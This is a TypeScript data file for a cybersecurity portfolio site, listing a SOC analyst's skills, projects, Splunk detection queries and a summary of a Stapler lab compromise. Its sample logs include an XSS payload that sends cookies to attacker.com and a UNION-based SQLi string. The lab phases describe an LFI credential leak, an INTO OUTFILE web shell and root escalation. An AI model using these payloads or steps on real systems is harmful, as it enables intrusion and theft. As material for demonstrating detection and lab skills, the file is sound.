export interface Project {
  id: string;
  title: string;
  category: 'security' | 'ai' | 'offensive' | 'web';
  tagline: string;
  description: string;
  metrics: string[];
  techStack: string[];
  liveUrl?: string;
  githubUrl?: string;
  featured: boolean;
  status: 'ONLINE' | 'ACTIVE' | 'ARCHIVED';
  hudCode: string;
  stats: { label: string; value: string }[];
}

export interface SiemQuerySample {
  id: string;
  title: string;
  tactic: string;
  description: string;
  splQuery: string;
  sampleLog: string;
  attackVector: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'INFO';
  mitreRef: string;
}

export interface OffSecPhase {
  phase: number;
  name: string;
  tool: string;
  target: string;
  action: string;
  technique: string;
  outputSummary: string;
}

export const PORTFOLIO_DATA = {
  personal: {
    name: "NARENDRA VIJAY BORHADE",
    handle: "CREATOR-NAREN",
    title: "SOC Analyst & Cybersecurity Specialist",
    subtitles: [
      "VAPT & Application Security Analyst",
      "Splunk Enterprise & SIEM Threat Hunter",
      "Python & AI-Assisted Security Tool Builder",
      "MCA Cyber Security Researcher",
    ],
    location: "Pune, Maharashtra, India",
    phone: "+91 8503041687",
    email: "narendra.via.mail@gmail.com",
    linkedin: "https://www.linkedin.com/in/narendra-borhade-developer",
    githubPrimary: "https://github.com/Creator-Naren",
    githubSecondary: "https://github.com/narendraborhade-creator",
    liveWebApps: [
      { name: "Aegis 3D Safe Browser", url: "https://aegisscans.dev" },
      { name: "Manga.for-me Privacy Reader", url: "https://manga-for-me.vercel.app" },
    ],
    summary:
      "Cybersecurity-focused MCA candidate (7.8/10 CGPA) skilled in SOC operations, SIEM log analysis, deep packet inspection, threat hunting, VAPT, and full-stack security engineering. Built a Splunk Enterprise SIEM lab analyzing 360,000+ Boss of the SOC (BOTS) events via custom SPL queries and completed offensive Linux exploitation labs on OffSec Proving Grounds (Stapler). Creator of Aegis 3D Safe Browser and multiple AI-assisted static vulnerability analyzers, DNS/DMARC posture dashboards, ML intrusion detection prototypes, and passive OSINT scanners.",
    securityClearance: "LEVEL-4 // AUTHORIZED",
    statusBadge: "THREAT MONITORING: ACTIVE",
    telemetry: {
      siemEventsAnalyzed: "360,000+",
      splunkSplQueries: "45+",
      offSecBoxPwned: "ROOT / LINUX",
      academicCgpa: "7.8 / 10.0",
      certificationsCount: "5 VERIFIED",
    }
  },

  skills: [
    {
      category: "SIEM, SOC & Network Defense",
      icon: "ShieldAlert",
      hudId: "MOD-01",
      skills: [
        { name: "Splunk Enterprise & SPL", level: 92, highlight: true },
        { name: "SIEM Log Analysis & Correlation", level: 90, highlight: true },
        { name: "Deep Packet Inspection (Wireshark DPI)", level: 88, highlight: true },
        { name: "Threat Hunting & Attack Timelines", level: 85, highlight: true },
        { name: "MITRE ATT&CK Framework", level: 88, highlight: false },
        { name: "Intrusion Detection Systems (IDS/Snort)", level: 82, highlight: false },
        { name: "Incident Response Triage", level: 85, highlight: false },
      ]
    },
    {
      category: "VAPT, AppSec & Threat Intel",
      icon: "Crosshair",
      hudId: "MOD-02",
      skills: [
        { name: "OWASP Top 10 Vulnerabilities", level: 90, highlight: true },
        { name: "OffSec Proving Grounds (Stapler)", level: 88, highlight: true },
        { name: "Nmap, smbclient & enum4linux", level: 90, highlight: true },
        { name: "LFI, SQLi & XSS Exploitation", level: 86, highlight: true },
        { name: "Linux Privilege Escalation", level: 84, highlight: false },
        { name: "DNS Security (DMARC, DKIM, SPF)", level: 92, highlight: false },
        { name: "HTTP Headers (HSTS, CSP, X-Frame)", level: 94, highlight: false },
        { name: "OSINT & Digital Forensics", level: 85, highlight: false },
      ]
    },
    {
      category: "Programming, Web & AI Security Tooling",
      icon: "Cpu",
      hudId: "MOD-03",
      skills: [
        { name: "Python 3 & Automation", level: 94, highlight: true },
        { name: "TypeScript & JavaScript (ES6+)", level: 90, highlight: true },
        { name: "FastAPI & Uvicorn Microservices", level: 88, highlight: true },
        { name: "Google Gemini API Integration", level: 92, highlight: true },
        { name: "AI-Assisted Static Code Analysis", level: 86, highlight: true },
        { name: "React.js, Next.js & Tailwind CSS", level: 90, highlight: false },
        { name: "Three.js 3D Visualizations", level: 82, highlight: false },
        { name: "scikit-learn & TensorFlow ML IDS", level: 80, highlight: false },
      ]
    },
    {
      category: "Cloud, Databases & Forensic Infrastructure",
      icon: "Server",
      hudId: "MOD-04",
      skills: [
        { name: "Google Cloud Platform (GCP)", level: 82, highlight: true },
        { name: "Linux Administration (Debian/Ubuntu/RHEL)", level: 88, highlight: true },
        { name: "Docker & Containerization", level: 80, highlight: false },
        { name: "PostgreSQL, MongoDB & SQLite", level: 85, highlight: false },
        { name: "Git, GitHub CI/CD & Vercel", level: 90, highlight: false },
        { name: "SHA-256 Forensics Hashing & Pytest", level: 88, highlight: false },
      ]
    }
  ],

  projects: [
    {
      id: "aegis-3d-browser",
      title: "Aegis 3D Safe Browser & Threat Scanner",
      category: "security",
      tagline: "3D Security Browser with SSRF Sandboxing & Gemini 2.5 AI Copilot",
      description: "Architected and deployed a 3D security-focused web browser featuring an SSRF-hardened sandbox proxy, real-time DNS scanning, HTTP security header inspection (HSTS, CSP, X-Frame-Options), and a hybrid Python FastAPI + Gemini 2.5 Flash Cyber AI Copilot.",
      metrics: ["SSRF-Hardened Proxy", "Real-Time DNS Health", "AI Copilot Integration"],
      techStack: ["TypeScript", "React", "Three.js", "Node.js", "FastAPI", "Gemini 2.5 Flash"],
      liveUrl: "https://aegisscans.dev",
      githubUrl: "https://github.com/Creator-Naren",
      featured: true,
      status: "ONLINE",
      hudCode: "PRJ-AEGIS-01",
      stats: [
        { label: "AI Model", value: "Gemini 2.5 Flash" },
        { label: "Architecture", value: "FastAPI + Three.js" },
        { label: "Deployment", value: "Production Web" },
      ]
    },
    {
      id: "splunk-bots-siem",
      title: "Enterprise Splunk SIEM & BOTS Threat Hunting",
      category: "security",
      tagline: "Ingestion and SPL Analysis across 360,000+ Boss of the SOC Events",
      description: "Ingested 360,000+ web events into Splunk Enterprise; wrote complex SPL queries to detect reconnaissance, Acunetix scans, blind SQLi, and XSS attacks. Correlated Wireshark PCAPs with endpoint logs to reconstruct forensic attack timelines.",
      metrics: ["360k+ Log Events Ingested", "Multi-Stage Attack Reconstruction", "Wireshark PCAP Correlation"],
      techStack: ["Splunk Enterprise", "SPL", "Wireshark", "Nmap", "Linux", "Snort IDS"],
      githubUrl: "https://github.com/Creator-Naren",
      featured: true,
      status: "ACTIVE",
      hudCode: "PRJ-SPLUNK-02",
      stats: [
        { label: "Events Ingested", value: "360,000+" },
        { label: "Attack Types", value: "SQLi, XSS, Scans" },
        { label: "Log Sources", value: "Apache, Suricata, PCAP" },
      ]
    },
    {
      id: "offsec-stapler",
      title: "OffSec Proving Grounds: Stapler Linux Exploitation",
      category: "offensive",
      tagline: "End-to-End Vulnerability Chaining & Privilege Escalation to Root",
      description: "Executed full TCP/UDP Nmap, FTP, and SMB (smbclient, enum4linux) enumeration. Chained a WordPress plugin LFI vulnerability (wp-config.php leak) with MySQL INTO OUTFILE RCE and Linux .bash_history/sudo privilege escalation to achieve root access.",
      metrics: ["Full Network Recon", "WordPress LFI -> RCE", "Linux Root Shell Pwned"],
      techStack: ["Kali Linux", "Nmap", "enum4linux", "smbclient", "WordPress LFI", "MySQL"],
      githubUrl: "https://github.com/Creator-Naren",
      featured: true,
      status: "ACTIVE",
      hudCode: "LAB-OFFSEC-03",
      stats: [
        { label: "Target Box", value: "Stapler (Linux)" },
        { label: "Final Privilege", value: "uid=0(root)" },
        { label: "Attack Path", value: "LFI -> MySQL RCE -> Root" },
      ]
    },
    {
      id: "bug-hunter-visual",
      title: "Bug-Hunter & Net-Visual-Analyzer",
      category: "ai",
      tagline: "AI Static Code Scanner & 3D Network Security Posture Topology",
      description: "Built Bug-Hunter to scan Python codebases via AI-assisted static analysis and generate remediation bug reports, alongside Net-Visual-Analyzer for automated DNS security scoring, DMARC/DKIM/SPF validation, and 3D network visualization.",
      metrics: ["Automated AST & AI Scan", "DMARC/DKIM Scoring", "3D Network Graph"],
      techStack: ["TypeScript", "React", "Node.js", "Firebase", "Gemini API", "Three.js"],
      githubUrl: "https://github.com/Creator-Naren",
      featured: false,
      status: "ONLINE",
      hudCode: "PRJ-BUGHUNT-04",
      stats: [
        { label: "Scanner Type", value: "AI-Static AST" },
        { label: "DNS Audit", value: "DMARC / SPF / DKIM" },
        { label: "Visual Engine", value: "Three.js Nodes" },
      ]
    },
    {
      id: "osint-ids-forensics",
      title: "OSINT-Scanner & ML Intrusion Detection",
      category: "security",
      tagline: "Passive Threat Reconnaissance & Isolation Forest / Autoencoder IDS",
      description: "Created a passive OSINT scanner (WHOIS, DNS, GeoIP, Shodan, subdomain/leak checks) with CLI/Tkinter GUI. Implemented an Isolation Forest & Autoencoder IDS prototype and a cross-platform Digital Forensics Toolkit with SHA-256 integrity verification.",
      metrics: ["Multi-Source OSINT", "ML Anomaly Detection", "SHA-256 Forensics"],
      techStack: ["Python", "scikit-learn", "TensorFlow", "SQLite", "Tkinter", "Pytest"],
      githubUrl: "https://github.com/narendraborhade-creator",
      featured: false,
      status: "ONLINE",
      hudCode: "PRJ-OSINT-05",
      stats: [
        { label: "ML Model", value: "Isolation Forest + Autoencoder" },
        { label: "Intelligence", value: "Shodan + GeoIP + WHOIS" },
        { label: "Forensic Integrity", value: "SHA-256 Audit Trail" },
      ]
    },
    {
      id: "manga-for-me",
      title: "Manga.for-me Privacy-Focused Reader",
      category: "web",
      tagline: "Concurrent 6-Provider Scraper with Anti-Tracking & Edge Caching",
      description: "Engineered a privacy-focused web application that aggregates 6 content providers concurrently with server-side access control, anti-tracking image proxying, 4s AbortController timeout guards, and Vercel Edge stale-while-revalidate caching.",
      metrics: ["6 Concurrent Providers", "Zero Tracker Leakage", "Vercel Edge Acceleration"],
      techStack: ["React", "JavaScript", "Node.js", "Vercel Edge", "Tailwind CSS"],
      liveUrl: "https://manga-for-me.vercel.app",
      featured: false,
      status: "ONLINE",
      hudCode: "PRJ-MANGA-06",
      stats: [
        { label: "Concurrent Feeds", value: "6 Content Sources" },
        { label: "Privacy Protection", value: "Image Proxy Guard" },
        { label: "Latency Guard", value: "4s AbortController" },
      ]
    },
  ] as Project[],

  siemSamples: [
    {
      id: "acunetix-recon",
      title: "Detect Acunetix Web Vulnerability Scanner Reconnaissance",
      tactic: "Reconnaissance (TA0043)",
      mitreRef: "T1595.002 - Vulnerability Scanning",
      description: "Identified aggressive web application scanning traffic generated by Acunetix WVS targeting web endpoints with high request velocity.",
      splQuery: 'index=botsv1 sourcetype=stream:http http_user_agent="*acunetix*" | stats count by src_ip, uri_path, status | sort - count',
      sampleLog: '2026-08-14 11:24:19.412 [stream:http] src=40.80.148.42 dst=192.168.250.70 method=GET uri="/login.php?id=acunetix_wvs_test" status=404 user_agent="Mozilla/5.0 (compatible; Acunetix WVS/10.0)" bytes=1482',
      attackVector: "Automated vulnerability scanner crawler probing endpoints",
      severity: "MEDIUM"
    },
    {
      id: "sqli-correlation",
      title: "Blind SQL Injection (SQLi) Web Tier Correlation",
      tactic: "Initial Access (TA0001)",
      mitreRef: "T1190 - Exploit Public-Facing Application",
      description: "Correlated malicious HTTP GET/POST parameters containing SQL injection payloads (UNION SELECT, SLEEP/BENCHMARK) against database response times.",
      splQuery: 'index=botsv1 sourcetype=stream:http (uri_query="*UNION*SELECT*" OR uri_query="*1=1*" OR uri_query="*sleep(*") | eval is_sqli="YES" | table _time, src_ip, uri_path, uri_query, status',
      sampleLog: '2026-08-14 12:05:43.881 [stream:http] src=40.80.148.42 dst=192.168.250.70 uri_query="cat=1%20UNION%20SELECT%201,version(),user(),database()--" status=200 response_time=124ms',
      attackVector: "Database schema exfiltration attempt via blind UNION-based SQLi",
      severity: "CRITICAL"
    },
    {
      id: "xss-payload",
      title: "Cross-Site Scripting (XSS) Reflection in HTTP Logs",
      tactic: "Execution (TA0002)",
      mitreRef: "T1059.007 - JavaScript Execution",
      description: "Tracked client-side script injection payloads reflected in user comment forums and search parameters.",
      splQuery: 'index=botsv1 sourcetype=access_combined (uri="*<script*" OR uri="*alert(*" OR uri="*onload=*") | stats count, values(uri) by clientip, method',
      sampleLog: '2026-08-14 12:44:02.109 [access_combined] clientip=192.168.1.155 request="GET /search.php?q=%3Cscript%3Edocument.location=%27http://attacker.com/steal?c=%27+document.cookie%3C/script%3E HTTP/1.1" status=200',
      attackVector: "Cookie exfiltration attempt via reflected DOM Cross-Site Scripting",
      severity: "HIGH"
    },
    {
      id: "pcap-ids-correlation",
      title: "Wireshark PCAP & Snort Alert Fusion",
      tactic: "Lateral Movement (TA0008)",
      mitreRef: "T1021.002 - SMB/Windows Admin Shares",
      description: "Fused Snort IDS alerts with Wireshark packet capture streams to verify unauthorized SMB/NTLM authentication attempts.",
      splQuery: 'index=botsv1 (sourcetype=snort OR sourcetype="pcap:smb") | transaction src_ip dst_ip maxspan=5m | search eventcount > 10',
      sampleLog: '2026-08-14 13:12:00.005 [snort:alert] [1:2001219:15] ET SCAN Potential SSH Brute Force [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 40.80.148.42:54122 -> 192.168.250.70:22',
      attackVector: "Brute force authentication flood followed by protocol downgrade",
      severity: "CRITICAL"
    }
  ] as SiemQuerySample[],

  offSecPhases: [
    {
      phase: 1,
      name: "Tactical Reconnaissance & Network Mapping",
      tool: "Nmap, smbclient, enum4linux",
      target: "Stapler Target (Linux 192.168.x.x)",
      action: "Executed comprehensive TCP/UDP port scans; mapped open NetBIOS/SMB shares and FTP services. Extracted active user lists via enum4linux RID cycling.",
      technique: "MITRE ATT&CK T1046 - Network Service Discovery",
      outputSummary: "Discovered ports 20/21 (FTP with anonymous payload), 22/139/445 (SMB), 80/12380 (Web servers). Identified users: harry, john, elly, peter."
    },
    {
      phase: 2,
      name: "WordPress Plugin LFI & Config Exfiltration",
      tool: "Custom Python Exploit / curl",
      target: "HTTPS Web Service Port 12380",
      action: "Analyzed outdated WordPress instance; discovered vulnerable Advanced Video Embedder plugin permitting Local File Inclusion (LFI). Leaked wp-config.php containing cleartext MySQL database credentials.",
      technique: "MITRE ATT&CK T1552.001 - Credentials in Files",
      outputSummary: "Leaked DB User: 'root' / DB Pass: 'plbkac' and revealed absolute server path: /var/www/https/blog."
    },
    {
      phase: 3,
      name: "Database RCE via MySQL INTO OUTFILE",
      tool: "MySQL CLI & PHP Web Shell",
      target: "MySQL Database Port 3306",
      action: "Authenticated directly to MySQL using exfiltrated credentials; leveraged file write privilege to dump a PHP backdoor via 'SELECT ... INTO OUTFILE /var/www/https/blog/shell.php'. Executed reverse shell.",
      technique: "MITRE ATT&CK T1505.003 - Web Shell Deployment",
      outputSummary: "Established interactive low-privileged reverse shell session as user 'www-data'."
    },
    {
      phase: 4,
      name: "Privilege Escalation to Root Shell",
      tool: "Linux Shell, sudo, bash_history inspection",
      target: "Linux Kernel / Sudoers",
      action: "Enumerated home directories; examined .bash_history and discovered admin credentials. Switched to user with unrestricted sudo privileges (sudo -i) to attain root UID 0.",
      technique: "MITRE ATT&CK T1548.003 - Sudo and Sudo Caching",
      outputSummary: "SUCCESS: # whoami -> root | # id -> uid=0(root) gid=0(root) groups=0(root). Proof flag retrieved."
    }
  ] as OffSecPhase[],

  experience: [
    {
      role: "Cyber Security Intern",
      company: "Codec Technologies India",
      location: "Mumbai, Maharashtra (Hybrid)",
      period: "Jul 2026 - Sep 2026",
      hudTag: "EXP-MISSION-01",
      highlights: [
        "Performed deep packet inspection (DPI) and network traffic analysis using Wireshark to detect protocol anomalies, suspicious payloads, and malicious signatures across enterprise packet captures.",
        "Completed structured operational training in cybersecurity protocols, threat intelligence frameworks, log triage, and defensive mitigation strategies under a senior project lead."
      ],
      technologies: ["Wireshark", "Deep Packet Inspection (DPI)", "Threat Intelligence", "Log Triage", "Protocol Analysis"]
    },
    {
      role: "Cyber Security Intern",
      company: "CodeAlpha",
      location: "Remote (Virtual)",
      period: "Jan 2026",
      hudTag: "EXP-MISSION-02",
      highlights: [
        "Analyzed application and network attack surfaces to identify security misconfigurations, evaluate emerging threat vectors, and implement foundational defensive security controls in a team environment."
      ],
      technologies: ["Attack Surface Mapping", "Vulnerability Assessment", "Defensive Controls", "Risk Analysis"]
    },
    {
      role: "Python Programming Intern & Creative Head",
      company: "Sqrock IT Solutions & NextGen AI",
      location: "Remote",
      period: "2025 - 2026",
      hudTag: "EXP-MISSION-03",
      highlights: [
        "Developed modular Python automation and data processing scripts at Sqrock IT Solutions.",
        "Directed technical content strategy, brand identity, and visual communication campaigns as Creative Head at NextGen AI."
      ],
      technologies: ["Python 3", "Script Automation", "Brand Identity", "Visual Communication", "Data Pipelines"]
    }
  ],

  certifications: [
    {
      title: "SOC Analyst & Cyber Security Fundamentals (47h 56m)",
      issuer: "Codec Technologies",
      date: "Sep 2026",
      credentialId: "CODEC-SOC-2026-NVB",
      status: "VERIFIED",
      skillsGained: "SOC Operations, SIEM Fundamentals, Alert Triage, Incident Response"
    },
    {
      title: "Trust and Security with Google Cloud",
      issuer: "Simplilearn SkillUp",
      date: "Feb 2026",
      credentialId: "GCP-SEC-SKILLUP-2026",
      status: "VERIFIED",
      skillsGained: "Cloud Security, IAM Governance, Encryption at Rest/Transit"
    },
    {
      title: "Protection from Browser Attacks & Introduction to System Security",
      issuer: "Vodafone Idea Foundation, VOIS & Edunet Foundation",
      date: "May 2026",
      credentialId: "VOIS-EDUNET-SYSSEC-2026",
      status: "VERIFIED",
      skillsGained: "Browser Sandbox Hardening, XSS/CSRF Prevention, OS Hardening"
    },
    {
      title: "Ethical Hacking & Cyber Security Certification Courses",
      issuer: "Programming Hub / Google Developers Launchpad",
      date: "Jul 2023",
      credentialId: "GDL-ETH-HACK-2023",
      status: "VERIFIED",
      skillsGained: "Network Scanning, Web App Penetration Testing, Cryptography"
    },
    {
      title: "Ethical Hacking & Cybersecurity Workshop (2-Hour)",
      issuer: "VaultofCodes",
      date: "2023",
      credentialId: "VOC-WS-CYBER",
      status: "VERIFIED",
      skillsGained: "Offensive Security Basics, Vulnerability Discovery"
    }
  ],

  education: [
    {
      degree: "Master of Computer Applications (MCA) in Cyber Security",
      institution: "PCET's Nutan Maharashtra Institute of Engineering and Technology (NMIET), Pune",
      university: "Savitribai Phule Pune University",
      period: "Aug 2025 - 2027 (Expected 2027)",
      cgpa: "7.8 / 10.0",
      hudCode: "EDU-PG-01",
      specialization: "Cyber Security, SIEM Engineering, Digital Forensics, Applied Cryptography"
    },
    {
      degree: "Bachelor of Computer Applications (BCA)",
      institution: "DY Patil University (School of Management), Pune",
      university: "DY Patil University",
      period: "2023 - 2025",
      cgpa: "7.5 / 10.0",
      hudCode: "EDU-UG-02",
      specialization: "Computer Science, Software Engineering, Object-Oriented Programming, Database Systems"
    }
  ]
};
